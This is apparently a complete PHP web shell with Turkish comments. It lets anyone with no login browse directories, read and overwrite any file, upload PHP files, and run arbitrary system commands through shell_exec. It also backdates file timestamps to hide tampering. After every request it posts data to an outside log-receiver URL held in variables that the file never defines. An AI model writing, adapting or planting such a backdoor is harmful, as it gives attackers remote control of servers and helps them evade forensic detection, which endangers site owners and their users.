<?php
session_start();

function getCurrentDirectory() {
    if (!isset($_SESSION['dir'])) {
        $_SESSION['dir'] = __DIR__;
    }
    if (isset($_POST['dir'])) {
        $_SESSION['dir'] = $_POST['dir'];
    }
    return $_SESSION['dir'];
}

function getDirectoryLinks($currentDirectory) {
    $dirs = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $path = '';
    $links = array();
    foreach ($dirs as $dir) {
        if (empty($dir)) {
            continue;
        }
        $path .= DIRECTORY_SEPARATOR . $dir;
        $links[] = '<a href="" onclick="event.preventDefault(); document.getElementById(\'dir\').value=\'' . $path . '\'; document.getElementById(\'changeDirForm\').submit();">' . $dir . '</a>';
    }
    return $links;
}

function getFileList($currentDirectory) {
    $files = scandir($currentDirectory);
    return $files;
}

$currentDir = getCurrentDirectory();
$directoryLinks = getDirectoryLinks($currentDir);
$fileList = getFileList($currentDir);

$fileToEdit = "";
$fileContent = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['edit'])) {
        $fileToEdit = $_POST['edit'];
        $fileContent = file_get_contents($fileToEdit);
    } elseif (isset($_POST['save'])) {
        $fileToEdit = $_POST['fileToEdit'];
        $fileContent = $_POST['fileContent'];
        file_put_contents($fileToEdit, $fileContent);
        $fileToEdit = "";
        $fileContent = "";
    } elseif (isset($_POST['change_date']) && isset($_POST['fileToChange'])) {
        $fileToChange = $_POST['fileToChange'];
        $time = strtotime($_POST['change_date']);
        touch($fileToChange, $time);
    } elseif (isset($_FILES['file_upload'])) {
        // Dosya yükleme işlemi
        $target_dir = $currentDir . DIRECTORY_SEPARATOR;
        $target_file = $target_dir . basename($_FILES["file_upload"]["name"]);
        $uploadOk = 1;
        $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
        // Dosya uzantısını kontrol et
        $allowedExtensions = array("php", "html");
        if (!in_array($fileType, $allowedExtensions)) {
            echo "Sadece PHP ve HTML dosyaları yüklenebilir.";
            $uploadOk = 0;
        }
        // Dosya boyutunu kontrol et (1MB)
        if ($_FILES["file_upload"]["size"] > 1000000) {
            echo "Dosya boyutu çok büyük.";
            $uploadOk = 0;
        }
        // Dosyayı yükle
        if ($uploadOk) {
            if (move_uploaded_file($_FILES["file_upload"]["tmp_name"], $target_file)) {
                echo "Dosya başarıyla yüklendi.";
            } else {
                echo "Dosya yükleme hatası.";
            }
        }
    } elseif (isset($_POST['command'])) {
        // Komut çalıştırma işlemi (güvenlik zafiyeti taşır, dikkatli kullanılmalıdır)
        $command = $_POST['command'];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    } elseif (isset($_POST['mainDir'])) {
        // Ana dizine geri dönme işlemi
        $_SESSION['dir'] = __DIR__;
    }


    $ch = curl_init($logReceiverUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
?>

<!DOCTYPE html>
<html>
<body>
<h1>Current directory: <?php echo implode(" / ", $directoryLinks); ?></h1>

<ul>
    <?php foreach ($fileList as $fileName) :
        if ($fileName != "." && $fileName != ".."): ?>
        <li>
            <?php
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
            $fileMTime = date("Y-m-d H:i:s", filemtime($filePath));
            if (is_dir($filePath)) : ?>
                <a href="" onclick="event.preventDefault(); document.getElementById('dir').value='<?php echo $filePath; ?>'; document.getElementById('changeDirForm').submit();"><?php echo $fileName; ?></a> (<?php echo $fileMTime; ?>)
            <?php else : ?>
                <?php echo $fileName; ?> (<?php echo $fileMTime; ?>)
                <button onclick="editFile('<?php echo $filePath; ?>')">Edit</button>
                <button onclick="changeDate('<?php echo $filePath; ?>')">Change Date</button>
            <?php endif; ?>
        </li>
        <?php endif;
    endforeach; ?>
</ul>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file_upload">
    <input type="submit" value="Upload">
</form>

<form method="POST">
    <input type="text" name="command" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>

<form method="POST">
    <input type="hidden" name="mainDir">
    <button type="submit">Main Directory</button>
</form>

<form method="POST" id="changeDirForm" style="display: none;">
    <input type="hidden" name="dir" id="dir">
</form>

<form method="POST" id="editForm" style="display: none;">
    <input type="hidden" name="edit" id="edit">
</form>

<form method="POST" id="changeDateForm" style="display: none;">
    <input type="hidden" name="fileToChange" id="fileToChange">
    <input type="hidden" name="change_date" id="change_date">
</form>

<?php if (!empty($fileToEdit)) : ?>
    <form method="POST">
        <input type="hidden" name="fileToEdit" value="<?php echo $fileToEdit; ?>">
        <textarea name="fileContent"><?php echo htmlspecialchars($fileContent); ?></textarea><br>
        <input type="submit" name="save" value="Save Changes">
    </form>
<?php endif; ?>

<script>
function editFile(filePath) {
    document.getElementById('edit').value = filePath;
    document.getElementById('editForm').submit();
}

function changeDate(filePath) {
    var newDate = prompt("Please enter the new date (YYYY-MM-DD H:i:s format):");
    if (newDate != null) {
        document.getElementById('fileToChange').value = filePath;
        document.getElementById('change_date').value = newDate;
        document.getElementById('changeDateForm').submit();
    }
}
</script>

</body>
</html>
